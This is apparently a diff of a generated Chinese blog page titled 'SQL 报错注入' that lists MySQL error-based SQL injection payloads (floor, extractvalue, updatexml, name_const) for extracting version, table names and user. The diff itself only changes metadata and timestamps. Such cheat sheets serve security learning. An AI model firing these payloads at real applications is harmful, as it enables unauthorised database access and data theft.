@@ -9,17 +9,17 @@
   
   <title>SQL 报错注入 | Grim&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="参考链接:SQL报错注入十二个函数 SQL报错注入的十二个函数0x01 floor报错1and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a); 0x02 ExtractValue报错1and extractvalue(1,">
+  <meta name="description" content="参考链接:SQL报错注入十二个函数 SQL报错注入的十二个函数">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL 报错注入">
 <meta property="og:url" content="http://yoursite.com/2018/07/06/sql报错注入/index.html">
 <meta property="og:site_name" content="Grim&#39;s blog">
-<meta property="og:description" content="参考链接:SQL报错注入十二个函数 SQL报错注入的十二个函数0x01 floor报错1and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a); 0x02 ExtractValue报错1and extractvalue(1,">
+<meta property="og:description" content="参考链接:SQL报错注入十二个函数 SQL报错注入的十二个函数">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-05-18T08:56:03.646Z">
+<meta property="og:updated_time" content="2018-07-06T10:43:14.889Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL 报错注入">
-<meta name="twitter:description" content="参考链接:SQL报错注入十二个函数 SQL报错注入的十二个函数0x01 floor报错1and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a); 0x02 ExtractValue报错1and extractvalue(1,">
+<meta name="twitter:description" content="参考链接:SQL报错注入十二个函数 SQL报错注入的十二个函数">
   
     <link rel="alternative" href="/atom.xml" title="Grim&#39;s blog" type="application/atom+xml">
   
@@ -297,7 +297,8 @@
       
           
         <p>参考链接:<a href="http://www.bugku.com/forum.php?mod=viewthread&amp;tid=93&amp;extra=page%3D1%26filter%3Dtypeid%26typeid%3D26" target="_blank" rel="noopener">SQL报错注入十二个函数</a></p>
-<h2 id="SQL报错注入的十二个函数"><a href="#SQL报错注入的十二个函数" class="headerlink" title="SQL报错注入的十二个函数"></a>SQL报错注入的十二个函数</h2><h3 id="0x01-floor报错"><a href="#0x01-floor报错" class="headerlink" title="0x01 floor报错"></a>0x01 floor报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
+<h2 id="SQL报错注入的十二个函数"><a href="#SQL报错注入的十二个函数" class="headerlink" title="SQL报错注入的十二个函数"></a>SQL报错注入的十二个函数</h2><a id="more"></a>
+<h3 id="0x01-floor报错"><a href="#0x01-floor报错" class="headerlink" title="0x01 floor报错"></a>0x01 floor报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
 <h3 id="0x02-ExtractValue报错"><a href="#0x02-ExtractValue报错" class="headerlink" title="0x02 ExtractValue报错"></a>0x02 ExtractValue报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br></pre></td></tr></table></figure>
 <h3 id="0x03-UpdateXml报错"><a href="#0x03-UpdateXml报错" class="headerlink" title="0x03 UpdateXml报错"></a>0x03 UpdateXml报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=(updatexml(1,concat(0x3a,(select user())),1))</span><br></pre></td></tr></table></figure>
 <h3 id="0x04-NAME-CONST报错"><a href="#0x04-NAME-CONST报错" class="headerlink" title="0x04 NAME_CONST报错"></a>0x04 NAME_CONST报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</span><br></pre></td></tr></table></figure>
@@ -321,7 +322,7 @@
         <p><span>本文标题:</span><a  href="/2018/07/06/sql报错注入/">SQL 报错注入</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 Mr1.Grim 的个人博客">Mr1.Grim</a></p>
         <p><span>发布时间:</span>2018年07月06日 - 13时24分</p>
-        <p><span>最后更新:</span>2018年05月18日 - 16时56分</p>
+        <p><span>最后更新:</span>2018年07月06日 - 18时43分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2018/07/06/sql报错注入/" title="SQL 报错注入">http://yoursite.com/2018/07/06/sql报错注入/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/07/06/sql报错注入/　　作者: Mr1.Grim" title=""></span>
